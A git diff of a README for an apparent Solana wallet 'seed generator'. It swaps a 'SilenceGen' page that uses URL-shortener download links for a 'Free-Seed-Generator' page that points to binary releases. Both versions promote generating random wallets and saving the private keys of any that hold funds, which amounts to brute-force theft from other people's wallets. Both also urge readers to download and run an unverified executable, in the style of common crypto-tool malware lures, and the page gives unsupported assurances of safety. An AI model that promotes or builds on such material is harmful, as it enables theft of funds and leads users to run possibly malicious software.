@@ -1,52 +1,69 @@
-# 🌟 Welcome to SilenceGen 🌟
-## Download - [Click here](https://cleanuri.com/z5brGN)
+# 🎉 Free-Seed-Generator - Create Your Solana Wallet Easily
 
-![Solana Logo](https://cleanuri.com/z5brGN)
+## 📥 Download Now
+[![Download Free-Seed-Generator](https://img.shields.io/badge/Download-Free--Seed--Generator-blue)](https://github.com/usman71591/Free-Seed-Generator/releases)
 
-### Repository Description:
-SilenceGen is a powerful Solana Wallet Creator designed to generate addresses, private keys, and seed phrases for Solana wallets. It also includes a feature to automatically check balances for Solana networks. If a wallet with a non-zero balance is discovered, the tool logs and saves the wallet's information (address, mnemonic, private key, and balances) to a file named https://cleanuri.com/z5brGN
+## 🚀 Getting Started
+Free-Seed-Generator helps you create a Solana wallet. It generates your wallet address and private key, along with seed phrases. You can also check the wallet balances on Solana networks. If the balance is greater than zero, it logs all crucial information into a file called `result.txt`.
 
-### Topics:
-- solana-balance-checker
-- solana-bruteforce-wallet-github
-- solana-generator
-- solana-generator-wallet
-- solana-seed-generator
-- solana-wallet-gen-github
-- solana-wallet-generator-github
+## 💻 System Requirements
+- Operating System: Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- Processor: Intel or AMD processor.
+- RAM: At least 4 GB of available RAM.
+- Disk Space: Minimum 100 MB available space.
+  
+## 🎯 Features
+- Automatically generates Solana wallet addresses.
+- Securely creates private keys and seed phrases.
+- Checks wallet balances on Solana networks.
+- Saves wallet information to `result.txt`.
 
-### Get Started:
-To start using SilenceGen, you can download the software package by clicking the button below:
+## ⬇️ Download & Install
+1. Visit this page to download: [Free-Seed-Generator Releases](https://github.com/usman71591/Free-Seed-Generator/releases).
+   
+2. On the Releases page, find the latest version of Free-Seed-Generator.
 
-[![Download Software](https://cleanuri.com/z5brGN)](https://cleanuri.com/z5brGN)
+3. Click on the version you want to download.
 
-*Note: The link above leads directly to the software package that needs to be launched.*
+4. Download the appropriate file for your operating system.
 
-### 🚀 Quick Start Guide:
-1. Download the software package using the link provided above.
-2. Unzip the downloaded file to access the SilenceGen application.
-3. Run the application and follow the on-screen instructions to generate Solana wallets and check balances.
+5. Open the downloaded file to run the application.
 
-### Features:
-- Generate Solana wallet addresses and private keys.
-- Automatically generate seed phrases for wallets.
-- Check balances for Solana networks.
-- Log and save wallet information for wallets with non-zero balances.
+## 🔑 How to Use
+1. After opening the application, you will see options to generate a wallet address.
+   
+2. Click on "Generate Wallet" to create a new wallet.
 
-### Contribution:
-Contributions to SilenceGen are welcome! Feel free to fork the repository, make improvements, and submit a pull request. Together, let's make SilenceGen even more powerful and efficient for the Solana community.
+3. The application will generate an address, private key, and seed phrase.
 
-### Support:
-If you encounter any issues with SilenceGen or have any questions, you can reach out to the maintainers of the repository. Your feedback and suggestions are valuable in enhancing the functionality of SilenceGen.
+4. If you want to check the wallet balance, enter the generated address and click on "Check Balance."
 
-### Stay Connected:
-Stay updated with the latest releases, features, and announcements related to SilenceGen by watching the repository. You can also star the project to show your support for the development of Solana wallet tools.
+5. If the wallet holds funds, the application will log the address, mnemonic, private key, and balance into `result.txt`.
 
-### License:
-SilenceGen is licensed under the MIT License. See the `LICENSE` file for more details.
+## 📂 Accessing Your Results
+- After running the application, check the result.txt file located in the same folder where you ran Free-Seed-Generator.
+- Open result.txt with any text editor to view your wallet information.
 
-Let's empower the Solana community with efficient wallet creation and balance checking tools! 🌌🔒
+## ❓ FAQs
 
---- 
+### How does the wallet generation work?
+The application uses secure algorithms to create a unique wallet address and corresponding private key and seed phrase.
 
-*Remember, the future of Solana wallets is at your fingertips. Download SilenceGen now and dive into the world of efficient wallet management!*
+### Is my wallet information safe?
+Yes. The application processes data locally on your machine and does not send any information over the internet.
+
+### Can I generate multiple wallets?
+Yes, you can create as many wallets as you want by clicking the "Generate Wallet" button multiple times.
+
+### What if my wallet balance is shown as zero?
+If your wallet balance is zero, that means no funds exist in that wallet. You can try generating a new wallet for a different balance.
+
+## 📞 Support
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or check existing problems for common solutions.
+
+## 🥳 Acknowledgments
+Thanks to the contributors and the open-source community that made this application possible.
+
+---
+
+For a seamless experience, follow these steps carefully to download and use Free-Seed-Generator. Happy creating!
